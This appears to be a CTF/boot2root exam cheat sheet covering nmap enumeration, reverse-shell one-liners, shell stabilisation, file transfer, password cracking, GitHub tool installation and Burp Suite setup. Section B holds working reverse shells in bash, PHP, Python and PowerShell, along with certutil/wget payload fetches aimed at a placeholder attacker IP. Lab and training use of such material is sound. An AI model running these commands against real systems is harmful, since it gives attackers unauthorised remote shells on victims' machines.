# Tools & Setup

## A. Setup & Workflow

**VPN connect**
```bash
sudo openvpn user.ovpn
# confirm tunnel
ip a show tun0
ping <target-ip>  # check reachability over VPN
```

**Per-target workflow (repeat for each of the 4-5 boxes)**
1. `nmap -p- -T4 --min-rate=5000 -oN allports.txt <ip>` — find every open port fast
2. `nmap -p<ports> -sC -sV -oN detailed.txt <ip>` — version/script scan on only those ports
3. Enumerate every service found — look for versions, defaults, anonymous access
4. Search version numbers for public exploits (searchsploit, DuckDuckGo "`<service> <version> exploit`")
5. Get a foothold (low-priv shell) → stabilize it → enumerate for privesc
6. Grab user.txt / root.txt or equivalent flags; note loot (creds, hashes) — often reused across boxes
7. Move to next box; reused creds/hashes are common in boot2root chains

> **Keep a running notes file per box:** IP, open ports, service versions, creds found, exploit used, flags captured. In a multi-box chain, creds/keys from one box often unlock the next.

> **Search engine note:** only **DuckDuckGo** (duckduckgo.com) is available — no Google. `searchsploit` locally still works offline regardless.

## B. Shells, Transfers & One-Liners

**Listener**
```bash
nc -lvnp 4444
# or for stability:
rlwrap nc -lvnp 4444
```

**Reverse shells**
```bash
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
php -r '$sock=fsockopen("<your-ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<your-ip>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object Net.Sockets.TCPClient("<your-ip>",4444);
```
Use revshells.com to generate/pick one for the exact target language.

**Shell stabilization (Linux)**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then:
export TERM=xterm
# Ctrl+Z, then on attacker:
stty raw -echo; fg
# back in shell:
reset
```

**File transfer**
```bash
# attacker (serve file):
python3 -m http.server 8000

# victim (Linux):
wget http://<your-ip>:8000/file
curl -O http://<your-ip>:8000/file

# victim (Windows):
certutil -urlcache -f http://<your-ip>:8000/file.exe file.exe
powershell -c "Invoke-WebRequest -Uri http://<your-ip>:8000/file -OutFile file"

# SCP back to attacker:
scp file user@<your-ip>:/tmp/
```

**Password cracking**
```bash
hydra -l user -P rockyou.txt ssh://<ip>
hashcat -m <mode> hash.txt rockyou.txt
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
```
Common hashcat modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 13100=Kerberoast.

**Useful recon one-liners**
```bash
# find writable files/dirs owned by other users
find / -writable -type d 2>/dev/null
# find files modified in last 10 min (often the flag/setup script)
find / -mmin -10 2>/dev/null
# search for the flag format anywhere
grep -r "flag{" / 2>/dev/null
```

## C. Installing GitHub Tools on the Pwnbox

Pwnbox is Parrot/Ubuntu-based with most common tools pre-installed; for anything missing, pull it from GitHub.

**Quick checks before installing**
```bash
which <tool>              # already installed?
apt list --installed | grep -i <tool>
```

**Pattern A — Python tool (most common: setup.py or requirements.txt)**
```bash
git clone https://github.com/<user>/<repo>.git
cd <repo>
pip3 install -r requirements.txt      # if present
pip3 install .                        # or: python3 setup.py install
# if it's a single script, just run it directly:
python3 <script>.py --help
```
If pip fails with an externally-managed-environment error:
```bash
pip3 install -r requirements.txt --break-system-packages
# or use a venv:
python3 -m venv venv && source venv/bin/activate && pip3 install -r requirements.txt
```

**Pattern B — Go tool**
```bash
git clone https://github.com/<user>/<repo>.git
cd <repo>
go build
# or, simplest if it's a public Go module:
go install github.com/<user>/<repo>@latest
# binary lands in ~/go/bin -- add to PATH if not already:
export PATH=$PATH:~/go/bin
```

**Pattern C — prebuilt binary / release**
```bash
# check the repo's Releases page, then:
wget https://github.com/<user>/<repo>/releases/download/<tag>/<asset>
chmod +x <asset>
mv <asset> /usr/local/bin/<toolname>   # or sudo mv, puts it on PATH
```

**Pattern D — shell script with a Makefile**
```bash
git clone https://github.com/<user>/<repo>.git
cd <repo>
make
sudo make install
```

**Common CTF tools you might need to pull manually**
```bash
git clone https://github.com/carlospolop/PEASS-ng          # linpeas/winpeas
git clone https://github.com/rebootuser/LinEnum
git clone https://github.com/AlessandroZ/LaZagne            # credential recovery
pip3 install impacket --break-system-packages                # secretsdump, psexec, GetUserSPNs, etc.
git clone https://github.com/fortra/impacket                  # if pip version is outdated/missing a script
git clone https://github.com/ropnop/kerbrute
```

**Tips**
- Put cloned tools in one folder (e.g. `~/tools/`) so you're not hunting for them mid-competition
- Add frequently used tool dirs to `PATH` in `~/.bashrc`:
```bash
echo 'export PATH=$PATH:~/tools/PEASS-ng/linPEAS' >> ~/.bashrc
source ~/.bashrc
```
- If network egress to GitHub is blocked on the exam VPN, download the tool beforehand on your host and transfer it over the VPN instead (file transfer, above)
- Always sanity-check a downloaded script before running it with elevated privileges

## D. Configuring Burp Suite

**Launch** (Pwnbox has it pre-installed, Community edition by default)
```bash
burpsuite &
# or find it in the apps menu; choose "Temporary project" + "Use Burp defaults" to start fast
```

**1. Set up the proxy listener**
- Proxy tab → Options → confirm a listener on `127.0.0.1:8080` is running (default, usually already there)
- Intercept is **on** by default — toggle it off unless you specifically want to pause/edit each request live

**2. Point your browser at the proxy**
- Firefox: Settings → Network Settings → Manual proxy → HTTP Proxy `127.0.0.1` port `8080`, check "Also use this proxy for HTTPS"
- Or use the **FoxyProxy** extension to toggle the Burp proxy on/off with one click

**3. Install Burp's CA certificate (needed for HTTPS targets)**
```
# with proxy set and Burp running, in the browser visit:
http://burp
# click "CA Certificate" to download it, then in Firefox:
# Settings -> Privacy & Security -> Certificates -> View Certificates -> Authorities -> Import -> select the downloaded cert -> check "Trust this CA to identify websites"
```

**4. Confirm traffic is flowing**
- Browse to the target; check Proxy → HTTP history — requests should be logging
- If nothing shows: re-check browser proxy settings, and that intercept isn't silently holding a request

**5. Useful panes for CTF work**
- **Target → Site map**: tree of everything crawled; right-click → "Add to scope" to filter noise
- **Proxy → HTTP history**: every request/response; right-click → **Send to Repeater**
- **Repeater**: manually edit/resend one request repeatedly — main tool for injection, param tampering, auth bypass
- **Intruder** (Community = rate-limited): automate payload fuzzing across a parameter
- **Decoder**: quick base64/URL/hex encode-decode
- **Comparer**: diff two responses to spot subtle differences

**6. Common gotchas**
- Non-standard port → browse `http://<ip>:<port>` explicitly
- Self-signed cert warnings even after importing CA → restart the browser after import
- Scope filtering hides items if scope is set but target isn't added
- Community edition has no active scanner — manual testing (Repeater/Intruder) is the workflow

**Quick Repeater workflow**
1. Browse normally with proxy on → find the request in HTTP history
2. Right-click → Send to Repeater (Ctrl+R)
3. Edit the parameter value directly, click Send, read the response
4. Iterate (SQLi payloads, path traversal, different content-types for upload bypass, etc.)
